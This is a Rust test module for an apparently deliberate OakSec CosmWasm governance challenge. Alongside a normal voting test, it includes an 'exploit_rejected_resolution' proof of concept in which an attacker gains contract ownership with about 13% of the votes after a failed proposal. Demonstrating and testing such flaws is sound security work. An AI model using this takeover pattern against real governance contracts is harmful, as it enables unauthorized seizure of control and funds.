#[cfg(test)]
pub mod tests {
    use crate::msg::{Cw20HookMsg, ExecuteMsg, QueryMsg};
    use crate::state::Config;
    use cosmwasm_std::{attr, to_binary, Addr, Empty, Uint128};
    use cw20::{Cw20ExecuteMsg, Cw20QueryMsg, MinterResponse, TokenInfoResponse};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    fn token_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            cw20_base::contract::execute,
            cw20_base::contract::instantiate,
            cw20_base::contract::query,
        );
        Box::new(contract)
    }

    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";
    pub const VOTING_WINDOW: u64 = 10;

    pub fn proper_instantiate() -> (App, Addr, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        let cw_20_id = app.store_code(token_contract());

        // Init token
        let token_inst = cw20_base::msg::InstantiateMsg {
            name: "OakSec Token".to_string(),
            symbol: "OST".to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };

        let token_addr = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Init challenge
        let challenge_inst = crate::msg::InstantiateMsg {
            token: token_addr.to_string(),
            owner: ADMIN.to_string(),
            window: VOTING_WINDOW,
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Minting - 10k to User1, 10k to User2, 100k to Admin
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: USER1.to_string(),
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: USER2.to_string(),
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: ADMIN.to_string(),
                amount: Uint128::new(100_000),
            },
            &[],
        )
        .unwrap();

        (app, contract_addr, token_addr)
    }

    pub fn base_scenario() -> (App, Addr, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        let cw_20_id = app.store_code(token_contract());

        // Init token
        let token_inst = cw20_base::msg::InstantiateMsg {
            name: "OakSec Token".to_string(),
            symbol: "OST".to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };

        let token_addr = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Init challenge
        let challenge_inst = crate::msg::InstantiateMsg {
            token: token_addr.to_string(),
            owner: ADMIN.to_string(),
            window: VOTING_WINDOW,
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Minting  100k to Admin
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: ADMIN.to_string(),
                amount: Uint128::new(100_000),
            },
            &[],
        )
        .unwrap();

        (app, contract_addr, token_addr)
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // cannot propose second time
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap_err();

        // Admin votes, simulates msg from CW20 contract
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(60_001),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));

        // Check ownership transfer
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER1.to_string());
    }

    const DICTATOR: &str = "dictator";
    const CANDIDATE: &str = "candidate";

    #[test]
    fn exploit_rejected_resolution() {
        // mints 100K token to ADMIN
        let (mut app, contract_addr, token_addr) = base_scenario();
        // query token total supply
        let token_supply: TokenInfoResponse = app
            .wrap()
            .query_wasm_smart(token_addr.clone(), &Cw20QueryMsg::TokenInfo {})
            .unwrap();
        assert_eq!(token_supply.total_supply, Uint128::new(100_000));

        // mints 20K token to DICTATOR and 30K to CANDIDATE
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: DICTATOR.to_string(),
                amount: Uint128::new(20_000),
            },
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: CANDIDATE.to_string(),
                amount: Uint128::new(30_000),
            },
            &[],
        )
        .unwrap();
        // Token supply is now 150K
        let token_supply: TokenInfoResponse = app
            .wrap()
            .query_wasm_smart(token_addr.clone(), &Cw20QueryMsg::TokenInfo {})
            .unwrap();
        assert_eq!(token_supply.total_supply, Uint128::new(150_000));

        // CANDIDATE proposes themselves
        app.execute_contract(
            Addr::unchecked(CANDIDATE),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();
        // Candidate votes for themselves
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(CANDIDATE),
            token_addr.clone(),
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(30_000),
            },
            &[],
        )
        .unwrap();

        // Time passes and proposal is rejected
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });
        let res = app
            .execute_contract(
                Addr::unchecked(DICTATOR),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();
        assert_eq!(res.events[1].attributes[2], attr("result", "Failed"));
        
        // Dictator proposes themselves
        app.execute_contract(
            Addr::unchecked(DICTATOR),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        ).unwrap();
        // Dictator votes for themselves
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(DICTATOR),
            token_addr.clone(),
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(20_000),
            },
            &[],
        ).unwrap();
        // Time passes and proposal is successful with only 
        // (20_000 / 150_000) ~ 13.3% of votes casted for DICTATOR 
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });
        let res = app
            .execute_contract(
                Addr::unchecked(DICTATOR),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap(); 
        assert_eq!(res.events[1].attributes[2], attr("result", "Passed"));
        // Dictator is now the owner
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, DICTATOR.to_string());
    }
}
